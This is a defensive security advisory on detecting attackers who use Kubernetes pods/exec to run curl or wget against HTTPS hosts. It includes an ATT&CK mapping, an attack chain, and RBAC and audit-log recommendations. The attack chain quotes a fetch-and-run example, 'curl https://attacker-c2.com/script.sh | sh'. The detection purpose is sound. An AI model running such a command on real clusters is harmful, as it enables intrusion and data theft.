---
title: Detecting Malicious Ingress Tool Transfer via Kubernetes Pod Exec
slug: 2026-08-k8s-pod-exec-curl-wget
description: This brief covers the detection of attackers using Kubernetes 'exec' APIs to stage tools or exfiltrate data by invoking 'curl' or 'wget' to HTTPS endpoints from within container workloads.
date: "2026-08-24T15:47:40Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - kubernetes
  - execution
  - c2
  - cloud
vendors:
  - Kubernetes
products:
  - Kubernetes
mitre_ttps:
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1609
    technique_name: Container Administration Command
    evidence: Detects pod or attach exec API calls where the decoded request query implies curl or wget fetching an https URL.
    confidence_band: high
  - tactic_id: TA0011
    tactic_name: Command and Control
    technique_id: T1105
    technique_name: Ingress Tool Transfer
    evidence: Attackers with permission to exec into workloads often run one-liners to stage tooling, pull scripts or binaries, or exfiltrate data over HTTPS.
    confidence_band: high
references:
  - https://attack.mitre.org/techniques/T1609/
  - https://attack.mitre.org/techniques/T1105/
  - https://github.com/elastic/detection-rules/blob/main/rules/integrations/kubernetes/execution_kubernetes_pod_exec_curl_wget_https.toml
action_plan:
  priority: elevated
  owners:
    - Detection Engineering
    - Cloud Security
  immediate_actions:
    - action: Deploy audit log monitoring for kubectl exec activities
      owner: Detection Engineering
      due: 48h
      evidence: Source provides specific logic for filtering exec audit events
  mitigation_plan:
    - priority: immediate
      action: Review and restrict RBAC pods/exec permissions
      owner: IT Operations
      addresses: T1609
      evidence: Source notes that tightening RBAC is critical for protection
---

Attackers with unauthorized or compromised access to Kubernetes environments frequently leverage the `exec` subresource of the Kubernetes API to interact with containerized workloads. By initiating an `exec` call, an attacker can execute arbitrary commands directly within the container namespace. A common post-exploitation pattern involves utilizing native binaries like `curl` or `wget` to fetch remote payloads, stage additional tooling, or exfiltrate sensitive data over HTTPS. This activity often bypasses standard network perimeter controls if the pod has egress connectivity to the internet. This detection brief focuses on monitoring Kubernetes API server audit logs to identify these specific command patterns, reconstructing the URL-encoded request URI to provide defenders with the exact command executed inside the pod, while filtering out benign cluster-internal traffic such as health checks and OIDC configuration lookups.

## Attack Chain

1. Attacker gains initial access to a Kubernetes principal (e.g., service account or user token) with `pods/exec` RBAC permissions.
2. Attacker enumerates target namespaces and pods using `kubectl get pods` or similar discovery commands.
3. Attacker initiates a `pods/exec` request against a target pod via the Kubernetes API server.
4. The request URI, containing the command (e.g., `curl https://attacker-c2.com/script.sh | sh`), is transmitted to the API server.
5. The API server logs the exec request in the cluster audit log.
6. The `curl` or `wget` utility executes inside the container, initiating an HTTPS connection to the external C2 or staging server.
7. The attacker stages secondary payloads, malicious scripts, or exfiltrates data from the pod environment.

## Impact

Successful exploitation of `pods/exec` for ingress tool transfer can lead to full compromise of the container environment, lateral movement within the cluster, and exfiltration of sensitive pod-accessible data, such as environment variables, mounted secrets, or cloud metadata.

## Recommendation

Detection engineers should focus on auditing and monitoring Kubernetes API server logs for anomalous execution patterns.

- Implement the provided detection logic to identify `exec` calls involving `curl` or `wget` to HTTPS URLs in your SIEM.
- Review RBAC policies across the cluster to ensure the `pods/exec` permission is restricted to authorized administrative or CI/CD identities.
- Baseline common administrative access patterns to identify outliers in the `user.name` or `source.ip` fields in audit logs.
- Regularly audit pod filesystem contents and container images to ensure no unauthorized persistence mechanisms or dropped tools are present.
